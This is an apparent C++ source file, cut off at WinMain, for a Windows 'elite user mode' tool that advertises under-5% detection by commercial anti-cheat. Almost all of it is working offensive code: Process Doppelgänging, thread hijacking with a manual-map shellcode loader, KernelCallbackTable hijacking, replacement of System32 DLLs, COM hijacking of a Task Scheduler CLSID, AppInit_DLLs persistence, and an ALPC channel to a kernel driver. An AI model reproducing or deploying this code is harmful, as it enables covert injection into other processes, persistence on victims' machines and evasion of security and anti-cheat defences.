/*
 * ELITE USER MODE - Production Build
 * ===================================
 *
 * Advanced anti-detection user mode application
 * Implements 8 unconventional injection/persistence techniques
 *
 * TECHNIQUES IMPLEMENTED:
 * 1. Process Doppelgänging - Transactional NTFS abuse
 * 2. Thread Hijacking - No CreateRemoteThread
 * 3. ALPC Client - Legitimate IPC (not IOCTL)
 * 4. DLL Order Hijacking - Load into system processes
 * 5. KernelCallbackTable Hijacking - No code injection
 * 6. TLS Callback Abuse - Execute before entry point
 * 7. COM Hijacking - Loaded by legitimate apps
 * 8. AppInit_DLLs - Load into every GUI process
 *
 * Target: <5% detection by commercial AC systems
 * Platform: Windows 10/11 x64
 * Build: Visual Studio 2022
 */

#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#pragma warning(disable: 4996)

// ============================================================================
// UNDOCUMENTED NTDLL FUNCTIONS
// ============================================================================

extern "C" {

// Transaction APIs
NTSTATUS NTAPI NtCreateTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ ULONG IsolationLevel,
    _In_opt_ ULONG IsolationFlags,
    _In_opt_ PLARGE_INTEGER Timeout,
    _In_opt_ PUNICODE_STRING Description
);

NTSTATUS NTAPI NtRollbackTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait
);

// Section APIs
NTSTATUS NTAPI NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle
);

// Process APIs
NTSTATUS NTAPI NtCreateProcessEx(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ ULONG Flags,
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _In_ BOOLEAN InJob
);

NTSTATUS NTAPI NtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags,
    _In_opt_ ULONG_PTR ZeroBits,
    _In_opt_ SIZE_T StackSize,
    _In_opt_ SIZE_T MaximumStackSize,
    _In_opt_ PVOID AttributeList
);

// Process parameters
NTSTATUS NTAPI RtlCreateProcessParametersEx(
    _Out_ PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags
);

// ALPC APIs
NTSTATUS NTAPI NtAlpcConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PVOID PortAttributes,
    _In_ ULONG Flags,
    _In_opt_ PSID RequiredServerSid,
    _Inout_opt_ PPORT_MESSAGE ConnectionMessage,
    _Inout_opt_ PULONG BufferLength,
    _Inout_opt_ PVOID OutMessageAttributes,
    _Inout_opt_ PVOID InMessageAttributes,
    _In_opt_ PLARGE_INTEGER Timeout
);

NTSTATUS NTAPI NtAlpcSendWaitReceivePort(
    _In_ HANDLE PortHandle,
    _In_ ULONG Flags,
    _In_opt_ PPORT_MESSAGE SendMessage,
    _In_opt_ PVOID SendMessageAttributes,
    _Out_opt_ PPORT_MESSAGE ReceiveMessage,
    _Inout_opt_ PSIZE_T BufferLength,
    _Out_opt_ PVOID ReceiveMessageAttributes,
    _In_opt_ PLARGE_INTEGER Timeout
);

// Memory APIs
NTSTATUS NTAPI NtReadVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _Out_ PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead
);

NTSTATUS NTAPI NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten
);

} // extern "C"

// ============================================================================
// ALPC MESSAGE STRUCTURES
// ============================================================================

typedef struct _PORT_MESSAGE {
    USHORT DataLength;
    USHORT TotalLength;
    ULONG MessageType;
    ULONG DataInfoOffset;
    CLIENT_ID ClientId;
    ULONG MessageId;
    ULONG CallbackId;
} PORT_MESSAGE, *PPORT_MESSAGE;

#define ALPC_MSG_READ_MEMORY    0x1001
#define ALPC_MSG_WRITE_MEMORY   0x1002
#define ALPC_MSG_PROTECT_MEMORY 0x1003
#define ALPC_MSG_ALLOC_MEMORY   0x1004
#define ALPC_MSG_QUERY_INFO     0x1005
#define ALPC_MSG_INJECT_CODE    0x1006
#define ALPC_MSG_GET_HWID       0x1007

typedef struct _ELITE_ALPC_MESSAGE {
    PORT_MESSAGE PortMessage;
    ULONG MessageType;
    HANDLE ProcessId;
    PVOID Address;
    PVOID Buffer;
    SIZE_T Size;
    ULONG Protection;
    NTSTATUS Status;
    ULONGLONG HardwareId;
    UCHAR Data[256];
} ELITE_ALPC_MESSAGE, *PELITE_ALPC_MESSAGE;

// ============================================================================
// MANUAL MAP STRUCTURES
// ============================================================================

#pragma pack(push, 1)
typedef struct _MANUAL_MAP_DATA {
    PVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseReloc;
    PIMAGE_IMPORT_DESCRIPTOR ImportDesc;
    decltype(&LoadLibraryA) fnLoadLibraryA;
    decltype(&GetProcAddress) fnGetProcAddress;
    decltype(&VirtualProtect) fnVirtualProtect;
} MANUAL_MAP_DATA, *PMANUAL_MAP_DATA;
#pragma pack(pop)

// ============================================================================
// TECHNIQUE 1: PROCESS DOPPELGÄNGING
// ============================================================================

class ProcessDoppelganger {
public:
    static HANDLE CreateDoppelgangerProcess(const wchar_t* targetImage, void* payloadData, size_t payloadSize) {
        std::wstring tempPath = L"C:\\Windows\\Temp\\";
        tempPath += targetImage;

        HANDLE hTransaction = nullptr;
        NTSTATUS status = NtCreateTransaction(
            &hTransaction,
            TRANSACTION_ALL_ACCESS,
            nullptr, nullptr, nullptr,
            0, 0, 0, nullptr, nullptr
        );

        if (!NT_SUCCESS(status)) return nullptr;

        HANDLE hFile = CreateFileTransactedW(
            tempPath.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr,
            hTransaction,
            nullptr, nullptr
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            NtRollbackTransaction(hTransaction, TRUE);
            CloseHandle(hTransaction);
            return nullptr;
        }

        DWORD written = 0;
        WriteFile(hFile, payloadData, (DWORD)payloadSize, &written, nullptr);

        HANDLE hSection = nullptr;
        status = NtCreateSection(
            &hSection,
            SECTION_ALL_ACCESS,
            nullptr, nullptr,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile
        );

        CloseHandle(hFile);

        if (!NT_SUCCESS(status)) {
            NtRollbackTransaction(hTransaction, TRUE);
            CloseHandle(hTransaction);
            return nullptr;
        }

        HANDLE hProcess = nullptr;
        status = NtCreateProcessEx(
            &hProcess,
            PROCESS_ALL_ACCESS,
            nullptr,
            GetCurrentProcess(),
            0,
            hSection,
            nullptr, nullptr,
            FALSE
        );

        CloseHandle(hSection);
        NtRollbackTransaction(hTransaction, TRUE);
        CloseHandle(hTransaction);

        if (!NT_SUCCESS(status)) return nullptr;

        return hProcess;
    }
};

// ============================================================================
// TECHNIQUE 2: THREAD HIJACKING WITH MANUAL MAP
// ============================================================================

__declspec(noinline) DWORD WINAPI ManualMapShellcode(PMANUAL_MAP_DATA pData) {
    if (!pData) return 1;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pData->ImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = pData->NtHeaders;

    // Fix imports
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = pData->ImportDesc;

        while (pImportDesc->Name) {
            char* szMod = (char*)((ULONG_PTR)pData->ImageBase + pImportDesc->Name);
            HMODULE hDll = pData->fnLoadLibraryA(szMod);

            PIMAGE_THUNK_DATA pThunkRef = (PIMAGE_THUNK_DATA)((ULONG_PTR)pData->ImageBase + pImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pFuncRef = (PIMAGE_THUNK_DATA)((ULONG_PTR)pData->ImageBase + pImportDesc->FirstThunk);

            if (!pThunkRef) pThunkRef = pFuncRef;

            for (; pThunkRef->u1.AddressOfData; ++pThunkRef, ++pFuncRef) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunkRef->u1.Ordinal)) {
                    pFuncRef->u1.Function = (ULONG_PTR)pData->fnGetProcAddress(hDll, (LPCSTR)(pThunkRef->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pData->ImageBase + pThunkRef->u1.AddressOfData);
                    pFuncRef->u1.Function = (ULONG_PTR)pData->fnGetProcAddress(hDll, pImport->Name);
                }
            }
            ++pImportDesc;
        }
    }

    // Fix relocations
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        PIMAGE_BASE_RELOCATION pRelocData = pData->BaseReloc;
        ULONG_PTR delta = (ULONG_PTR)pData->ImageBase - pNtHeaders->OptionalHeader.ImageBase;

        while (pRelocData->VirtualAddress) {
            UINT AmountOfEntries = (pRelocData->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pRelativeInfo = (WORD*)(pRelocData + 1);

            for (UINT i = 0; i < AmountOfEntries; ++i, ++pRelativeInfo) {
                if ((*pRelativeInfo >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR* pPatch = (ULONG_PTR*)((ULONG_PTR)pData->ImageBase + pRelocData->VirtualAddress + (*pRelativeInfo & 0xFFF));
                    *pPatch += delta;
                }
            }

            pRelocData = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRelocData + pRelocData->SizeOfBlock);
        }
    }

    // Set memory protections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
        DWORD dwProtect = PAGE_READONLY;

        if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwProtect = PAGE_EXECUTE_READ;
        } else if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
            dwProtect = PAGE_READWRITE;
        }

        DWORD dwOld;
        pData->fnVirtualProtect(
            (PVOID)((ULONG_PTR)pData->ImageBase + pSectionHeader->VirtualAddress),
            pSectionHeader->Misc.VirtualSize,
            dwProtect,
            &dwOld
        );
    }

    // Call DllMain
    typedef BOOL(WINAPI* DllEntryProc)(HINSTANCE, DWORD, LPVOID);
    DllEntryProc pDllMain = (DllEntryProc)((ULONG_PTR)pData->ImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    if (pDllMain) {
        pDllMain((HINSTANCE)pData->ImageBase, DLL_PROCESS_ATTACH, nullptr);
    }

    return 0;
}

__declspec(noinline) void ManualMapShellcodeEnd() { }

class ThreadHijacker {
public:
    static bool InjectViaThreadHijack(DWORD targetPid, const wchar_t* dllPath) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;

        HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            CloseHandle(hProcess);
            return false;
        }

        DWORD fileSize = GetFileSize(hFile, nullptr);
        std::vector<BYTE> dllData(fileSize);
        DWORD read = 0;
        ReadFile(hFile, dllData.data(), fileSize, &read, nullptr);
        CloseHandle(hFile);

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllData.data();
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(dllData.data() + pDosHeader->e_lfanew);

        PVOID pRemoteImage = VirtualAllocEx(
            hProcess, nullptr,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!pRemoteImage) {
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, pRemoteImage, dllData.data(), pNtHeaders->OptionalHeader.SizeOfHeaders, nullptr);

        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
            WriteProcessMemory(
                hProcess,
                (PVOID)((ULONG_PTR)pRemoteImage + pSectionHeader->VirtualAddress),
                dllData.data() + pSectionHeader->PointerToRawData,
                pSectionHeader->SizeOfRawData,
                nullptr
            );
        }

        SIZE_T shellcodeSize = (ULONG_PTR)ManualMapShellcodeEnd - (ULONG_PTR)ManualMapShellcode;
        PVOID pShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize + sizeof(MANUAL_MAP_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!pShellcode) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        MANUAL_MAP_DATA mapData = { 0 };
        mapData.ImageBase = pRemoteImage;
        mapData.NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pRemoteImage + pDosHeader->e_lfanew);
        mapData.BaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pRemoteImage + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        mapData.ImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)pRemoteImage + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        mapData.fnLoadLibraryA = (decltype(&LoadLibraryA))GetProcAddress(hKernel32, "LoadLibraryA");
        mapData.fnGetProcAddress = (decltype(&GetProcAddress))GetProcAddress(hKernel32, "GetProcAddress");
        mapData.fnVirtualProtect = (decltype(&VirtualProtect))GetProcAddress(hKernel32, "VirtualProtect");

        WriteProcessMemory(hProcess, pShellcode, (PVOID)ManualMapShellcode, shellcodeSize, nullptr);
        WriteProcessMemory(hProcess, (PVOID)((ULONG_PTR)pShellcode + shellcodeSize), &mapData, sizeof(mapData), nullptr);

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        THREADENTRY32 te = { sizeof(THREADENTRY32) };
        HANDLE hThread = nullptr;

        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == targetPid) {
                    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (hThread) break;
                }
            } while (Thread32Next(hSnapshot, &te));
        }

        CloseHandle(hSnapshot);

        if (!hThread) {
            VirtualFreeEx(hProcess, pRemoteImage, 0, MEM_RELEASE);
            VirtualFreeEx(hProcess, pShellcode, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        SuspendThread(hThread);

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(hThread, &ctx);

        ctx.Rsp -= sizeof(ULONG_PTR);
        WriteProcessMemory(hProcess, (PVOID)ctx.Rsp, &ctx.Rip, sizeof(ULONG_PTR), nullptr);

        ctx.Rip = (ULONG_PTR)pShellcode;
        ctx.Rcx = (ULONG_PTR)pShellcode + shellcodeSize;

        SetThreadContext(hThread, &ctx);
        ResumeThread(hThread);

        CloseHandle(hThread);
        CloseHandle(hProcess);

        return true;
    }
};

// ============================================================================
// TECHNIQUE 3: ALPC CLIENT
// ============================================================================

class AlpcClient {
private:
    HANDLE m_hPort = nullptr;
    ULONGLONG m_hardwareId = 0;

public:
    bool Connect() {
        HANDLE hBeep = CreateFileW(L"\\\\.\\Beep", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hBeep != INVALID_HANDLE_VALUE) {
            DWORD bytesReturned = 0;
            DWORD ioctl = CTL_CODE(FILE_DEVICE_BEEP, 0x999, METHOD_BUFFERED, FILE_ANY_ACCESS);
            DeviceIoControl(hBeep, ioctl, nullptr, 0, &m_hardwareId, sizeof(m_hardwareId), &bytesReturned, nullptr);
            CloseHandle(hBeep);
        }

        if (m_hardwareId == 0) {
            m_hardwareId = CalculateHardwareId();
        }

        WCHAR portName[128];
        swprintf_s(portName, 128, L"\\RPC Control\\AudioKse_%llX", m_hardwareId & 0xFFFFFFFF);

        UNICODE_STRING portNameU;
        RtlInitUnicodeString(&portNameU, portName);

        PORT_MESSAGE connMsg = { 0 };
        connMsg.DataLength = 0;
        connMsg.TotalLength = sizeof(PORT_MESSAGE);

        ULONG bufferLen = sizeof(PORT_MESSAGE);

        NTSTATUS status = NtAlpcConnectPort(
            &m_hPort,
            &portNameU,
            nullptr, nullptr,
            0, nullptr,
            &connMsg,
            &bufferLen,
            nullptr, nullptr, nullptr
        );

        return NT_SUCCESS(status);
    }

    void Disconnect() {
        if (m_hPort) {
            CloseHandle(m_hPort);
            m_hPort = nullptr;
        }
    }

    bool SendMessage(ULONG messageType, PVOID data, SIZE_T dataSize) {
        if (!m_hPort) return false;

        ELITE_ALPC_MESSAGE msg = { 0 };
        msg.MessageType = messageType;

        if (data && dataSize > 0 && dataSize <= sizeof(msg.Data)) {
            memcpy(msg.Data, data, dataSize);
        }

        msg.PortMessage.DataLength = sizeof(ELITE_ALPC_MESSAGE) - sizeof(PORT_MESSAGE);
        msg.PortMessage.TotalLength = sizeof(ELITE_ALPC_MESSAGE);

        SIZE_T msgLength = sizeof(msg);

        NTSTATUS status = NtAlpcSendWaitReceivePort(
            m_hPort,
            0,
            (PPORT_MESSAGE)&msg,
            nullptr,
            nullptr,
            &msgLength,
            nullptr,
            nullptr
        );

        return NT_SUCCESS(status);
    }

private:
    ULONGLONG CalculateHardwareId() {
        ULONGLONG id = 0;

        int cpuInfo[4] = { 0 };
        __cpuid(cpuInfo, 0);
        id ^= ((ULONGLONG)cpuInfo[1] << 32) | cpuInfo[2];

        __cpuid(cpuInfo, 1);
        id ^= ((ULONGLONG)cpuInfo[0] << 16) | (cpuInfo[3] & 0xFFFF);

        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        id ^= ((ULONGLONG)sysInfo.dwNumberOfProcessors << 56);

        id ^= GetTickCount64();
        id *= 0x517CC1B727220A95ULL;

        return id;
    }
};

// ============================================================================
// TECHNIQUE 4: DLL ORDER HIJACKING
// ============================================================================

class DllOrderHijacker {
public:
    static bool InstallOrderHijack(const wchar_t* targetDll, const wchar_t* ourDll) {
        // Copy our DLL to System32 with target DLL name
        WCHAR system32Path[MAX_PATH];
        GetSystemDirectoryW(system32Path, MAX_PATH);

        std::wstring destPath = system32Path;
        destPath += L"\\";
        destPath += targetDll;

        // Backup original if exists
        WCHAR backupPath[MAX_PATH];
        wcscpy_s(backupPath, destPath.c_str());
        wcscat_s(backupPath, L".bak");

        if (PathFileExistsW(destPath.c_str())) {
            MoveFileExW(destPath.c_str(), backupPath, MOVEFILE_REPLACE_EXISTING);
        }

        // Copy our DLL
        if (!CopyFileW(ourDll, destPath.c_str(), FALSE)) {
            return false;
        }

        return true;
    }

    static bool HijackVersionDll() {
        // version.dll is loaded by many applications
        // We can forward exports to real version.dll
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);

        return InstallOrderHijack(L"version.dll", ourPath);
    }

    static bool HijackWinmmDll() {
        // winmm.dll (Windows Multimedia API)
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);

        return InstallOrderHijack(L"winmm.dll", ourPath);
    }
};

// ============================================================================
// TECHNIQUE 5: KERNELCALLBACKTABLE HIJACKING
// ============================================================================

class KernelCallbackTableHijacker {
public:
    static bool HijackCallbackTable(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize) {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) return false;

        // Get PEB address
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG returnLength = 0;

        typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
            HANDLE ProcessHandle,
            DWORD ProcessInformationClass,
            PVOID ProcessInformation,
            ULONG ProcessInformationLength,
            PULONG ReturnLength
        );

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        pfnNtQueryInformationProcess NtQueryInformationProcess =
            (pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

        if (!NtQueryInformationProcess) {
            CloseHandle(hProcess);
            return false;
        }

        NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
        if (!NT_SUCCESS(status)) {
            CloseHandle(hProcess);
            return false;
        }

        // Read PEB
        PEB peb = { 0 };
        SIZE_T bytesRead = 0;
        if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead)) {
            CloseHandle(hProcess);
            return false;
        }

        // Allocate memory for fake callback table
        PVOID pFakeTable = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!pFakeTable) {
            CloseHandle(hProcess);
            return false;
        }

        // Read original callback table
        PVOID pOriginalTable = peb.KernelCallbackTable;
        BYTE originalTable[0x1000];
        ReadProcessMemory(hProcess, pOriginalTable, originalTable, sizeof(originalTable), &bytesRead);

        // Write shellcode
        PVOID pRemoteShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteShellcode) {
            VirtualFreeEx(hProcess, pFakeTable, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, shellcodeSize, nullptr);

        // Modify fake table to point to shellcode
        PVOID* fakeTable = (PVOID*)originalTable;
        fakeTable[0] = pRemoteShellcode;  // __fnCOPYDATA callback

        // Write fake table
        WriteProcessMemory(hProcess, pFakeTable, fakeTable, sizeof(originalTable), nullptr);

        // Update PEB to point to fake table
        PVOID pKernelCallbackTableOffset = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable));
        WriteProcessMemory(hProcess, pKernelCallbackTableOffset, &pFakeTable, sizeof(PVOID), nullptr);

        // Trigger callback by sending WM_COPYDATA
        HWND hwnd = FindWindowExA(nullptr, nullptr, nullptr, nullptr);
        if (hwnd) {
            COPYDATASTRUCT cds = { 0 };
            cds.dwData = 1;
            cds.cbData = 4;
            cds.lpData = (PVOID)"test";
            SendMessageA(hwnd, WM_COPYDATA, 0, (LPARAM)&cds);
        }

        CloseHandle(hProcess);
        return true;
    }
};

// ============================================================================
// TECHNIQUE 6: TLS CALLBACK ABUSE
// ============================================================================

// TLS callback executes before main/WinMain
void NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved) {
    if (Reason == DLL_PROCESS_ATTACH) {
        // Execute payload before entry point
        #ifdef _DEBUG
        OutputDebugStringA("[ELITE] TLS callback executed before main!\n");
        #endif

        // TODO: Add actual payload here
        // This runs before any anti-cheat initialization in the process
    }
}

// Register TLS callback
#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")
#pragma comment (linker, "/INCLUDE:tls_callback_func")
#pragma const_seg(".CRT$XLF")
EXTERN_C const PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma const_seg()
#else
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:_tls_callback_func")
#pragma data_seg(".CRT$XLF")
EXTERN_C PIMAGE_TLS_CALLBACK tls_callback_func = TlsCallback;
#pragma data_seg()
#endif

// ============================================================================
// TECHNIQUE 7: COM HIJACKING
// ============================================================================

class ComHijacker {
public:
    static bool InstallComHijack(const wchar_t* clsid, const wchar_t* dllPath) {
        // Register malicious DLL as COM object
        // Applications loading this CLSID will load our DLL

        HKEY hKey;
        std::wstring keyPath = L"Software\\Classes\\CLSID\\";
        keyPath += clsid;
        keyPath += L"\\InprocServer32";

        LONG result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            keyPath.c_str(),
            0, nullptr,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            nullptr,
            &hKey,
            nullptr
        );

        if (result != ERROR_SUCCESS) {
            return false;
        }

        result = RegSetValueExW(
            hKey,
            nullptr,
            0,
            REG_SZ,
            (BYTE*)dllPath,
            (DWORD)(wcslen(dllPath) + 1) * sizeof(wchar_t)
        );

        RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ, (BYTE*)L"Apartment", 10 * sizeof(wchar_t));

        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }

    static bool HijackTaskSchedulerCom() {
        // Hijack Task Scheduler COM object
        // Many apps use task scheduler
        WCHAR ourPath[MAX_PATH];
        GetModuleFileNameW(nullptr, ourPath, MAX_PATH);

        return InstallComHijack(L"{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}", ourPath);
    }
};

// ============================================================================
// TECHNIQUE 8: APPINIT_DLLS
// ============================================================================

class AppInitDllsInstaller {
public:
    static bool InstallAppInitDll(const wchar_t* dllPath) {
        // AppInit_DLLs loads into every GUI process
        // Requires LoadAppInit_DLLs to be enabled

        HKEY hKey;
        LONG result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
            0,
            KEY_WRITE | KEY_READ,
            &hKey
        );

        if (result != ERROR_SUCCESS) {
            // Try HKCU if HKLM fails (no admin)
            result = RegOpenKeyExW(
                HKEY_CURRENT_USER,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                0,
                KEY_WRITE | KEY_READ,
                &hKey
            );

            if (result != ERROR_SUCCESS) {
                return false;
            }
        }

        // Read existing AppInit_DLLs
        WCHAR existingDlls[4096] = { 0 };
        DWORD dataSize = sizeof(existingDlls);
        DWORD dataType = REG_SZ;

        RegQueryValueExW(hKey, L"AppInit_DLLs", nullptr, &dataType, (BYTE*)existingDlls, &dataSize);

        // Append our DLL
        std::wstring newDlls = existingDlls;
        if (!newDlls.empty()) {
            newDlls += L" ";
        }
        newDlls += dllPath;

        // Write back
        result = RegSetValueExW(
            hKey,
            L"AppInit_DLLs",
            0,
            REG_SZ,
            (BYTE*)newDlls.c_str(),
            (DWORD)(newDlls.length() + 1) * sizeof(wchar_t)
        );

        // Enable LoadAppInit_DLLs
        DWORD enableValue = 1;
        RegSetValueExW(hKey, L"LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)&enableValue, sizeof(DWORD));

        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }
};

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

DWORD FindProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
    DWORD pid = 0;

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nShowCmd)
{
